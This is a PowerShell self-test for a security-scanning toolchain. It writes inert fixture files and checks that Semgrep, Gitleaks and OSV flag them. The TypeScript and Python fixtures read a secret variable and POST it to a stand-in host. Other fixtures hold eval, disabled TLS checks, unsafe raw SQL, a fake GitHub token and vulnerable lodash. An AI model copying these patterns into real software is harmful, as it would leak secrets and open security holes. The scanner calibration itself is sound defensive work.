#Requires -Version 7.0
[CmdletBinding()]
param([string]$ToolsRoot = 'D:\knownai\outputs\job-catalog-handoff-2026-11-08\evidence\2026-11-09\security-tools')
$ErrorActionPreference = 'Stop'
$PSNativeCommandUseErrorActionPreference = $false
$stage = 'initialization'
try {
. (Join-Path $PSScriptRoot 'path-safety.ps1')
$stage = 'self-test-paths'
$ToolsRoot = Get-AuditSafePath -Path $ToolsRoot -Kind Directory -MustExist
$fixtureRoot = New-AuditSafeDirectory -Path (Join-Path $ToolsRoot ('review-inputs/synthetic-' + [guid]::NewGuid().ToString('N'))) -Root $ToolsRoot
function Get-FixturePath([string]$Name) { return Get-AuditSafePath -Path (Join-Path $fixtureRoot $Name) -Root $fixtureRoot -Kind File }
'*' | Set-Content -LiteralPath (Get-FixturePath '.semgrepignore') -Encoding utf8
# Inert source text; none of these files is ever executed.
@'
import { exec } from "node:child_process";
import fs from "node:fs";
const token = process.env.SYNTHETIC_SECRET;
const text = fs.readFileSync("/synthetic/source.txt", "utf8");
fetch("https://audit-fixture.invalid/upload", { method: "POST", body: token + text });
eval("synthetic_code"); // nosemgrep
const tlsOptions = { rejectUnauthorized: false };
db.$queryRawUnsafe("SELECT " + untrusted);
'@ | Set-Content -LiteralPath (Get-FixturePath 'risk.ts') -Encoding utf8
@'
import os, requests, subprocess
token = os.getenv("SYNTHETIC_SECRET")
requests.post("https://audit-fixture.invalid/upload", data=token)
subprocess.run(["echo", "synthetic"])
'@ | Set-Content -LiteralPath (Get-FixturePath 'risk.py') -Encoding utf8
@'
package fixture
import ("net/http"; "os"; "os/exec")
func inert() { _ = os.Getenv("SYNTHETIC_SECRET"); _, _ = http.Get("https://audit-fixture.invalid/"); _ = exec.Command("echo", "synthetic") }
'@ | Set-Content -LiteralPath (Get-FixturePath 'risk.go') -Encoding utf8
'export const sum = (left: number, right: number) => left + right;' | Set-Content -LiteralPath (Get-FixturePath 'clean.ts') -Encoding utf8
# Deliberately invalid synthetic credential in the shape of a GitHub PAT.
$fakeToken = 'ghp_' + 'A9b8C7d6E5f4G3h2I1j0K9l8M7n6P5q4R3s2'
('SYNTHETIC_GITHUB_TOKEN=' + $fakeToken) | Set-Content -LiteralPath (Get-FixturePath 'synthetic-token.txt') -Encoding utf8
@'
{"name":"security-calibration-only","version":"0.0.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"security-calibration-only","version":"0.0.0","dependencies":{"lodash":"4.17.20"}},"node_modules/lodash":{"version":"4.17.20","resolved":"https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz"}}}
'@ | Set-Content -LiteralPath (Get-FixturePath 'package-lock.json') -Encoding utf8
$runner = Get-AuditSafePath -Path (Join-Path $PSScriptRoot 'invoke-local-scan.ps1') -Kind File -MustExist
$stage = 'self-test-scanners'
$runnerOutput = & pwsh -NoProfile -File $runner -SourceRoot $fixtureRoot -ToolsRoot $ToolsRoot -Label 'synthetic-self-test'
$runnerExit = $LASTEXITCODE
if ($runnerExit -ne 1) { throw "Expected review-required exit 1 for synthetic risks, got $runnerExit. $runnerOutput" }
$summary = ($runnerOutput | Out-String) | ConvertFrom-Json
$safeReportRoot = Get-AuditSafePath -Path $summary.reportRoot -Root (Join-Path $ToolsRoot 'reports') -Kind Directory -MustExist
$null = @(Get-AuditSafeTree -Path $safeReportRoot -Root $ToolsRoot)
if (@($summary.results).Count -ne 3 -or @($summary.results | Where-Object status -ne 'review_required').Count) { throw 'All three scanners must report the planted risks without scanner errors.' }
if (@($summary.results | Where-Object scanner -eq 'gitleaks')[0].exitCode -ne 10) { throw 'Gitleaks findings must use dedicated exit code 10.' }
$sast = Get-Content -LiteralPath (Join-Path $summary.reportRoot 'semgrep.json') -Raw | ConvertFrom-Json
$expectedRules = @('catalog.js.dynamic-execution', 'catalog.js.process-execution', 'catalog.js.environment-read', 'catalog.js.network-sink', 'catalog.js.file-read', 'catalog.js.disabled-tls-verification', 'catalog.js.unsafe-raw-sql', 'catalog.python.dynamic-execution', 'catalog.python.environment-read', 'catalog.python.network-sink', 'catalog.go.process-execution', 'catalog.go.environment-read', 'catalog.go.network-sink')
foreach ($rule in $expectedRules) {
    if (!@($sast.results | Where-Object { $_.check_id.EndsWith($rule) }).Count) { throw "Synthetic SAST rule did not fire: $rule" }
}
if (@($sast.results | Where-Object { $_.path.EndsWith('clean.ts') }).Count) { throw 'Clean control unexpectedly triggered SAST.' }
$leakText = Get-Content -LiteralPath (Join-Path $summary.reportRoot 'gitleaks.json') -Raw
$leaks = $leakText | ConvertFrom-Json
if (!@($leaks | Where-Object RuleID -eq 'github-pat').Count -or $leakText.Contains($fakeToken)) { throw 'Gitleaks must detect and fully redact the synthetic PAT.' }
$osv = Get-Content -LiteralPath (Join-Path $summary.reportRoot 'osv.json') -Raw | ConvertFrom-Json
$vulnerable = @($osv.results | ForEach-Object { $_.packages } | Where-Object { $_.package.name -eq 'lodash' -and $_.package.version -eq '4.17.20' -and @($_.vulnerabilities).Count -gt 0 })
if (!$vulnerable.Count) { throw 'Offline OSV must report a known lodash 4.17.20 advisory.' }
$receipt = [ordered]@{ status = 'passed_synthetic_calibration_only'; executedAt = (Get-Date).ToUniversalTime().ToString('o'); fixtureRoot = $fixtureRoot; reportRoot = $summary.reportRoot; expectedRules = $expectedRules; gitleaksRedacted = $true; knownVulnerableNpmPackageDetected = $true; businessCodeScanned = $false }
Write-AuditText -Path (Join-Path $safeReportRoot 'self-test-receipt.json') -Root $ToolsRoot -Text ($receipt | ConvertTo-Json -Depth 6)
$receipt | ConvertTo-Json -Depth 6
exit 0
} catch {
    if (Get-Command Write-AuditFailure -ErrorAction SilentlyContinue) { Write-AuditFailure -Stage $stage -ToolsRoot $ToolsRoot -ErrorType $_.Exception.GetType().Name }
    else { [Console]::Error.WriteLine('{"status":"scanner_error","stage":"initialization"}') }
    exit 2
}
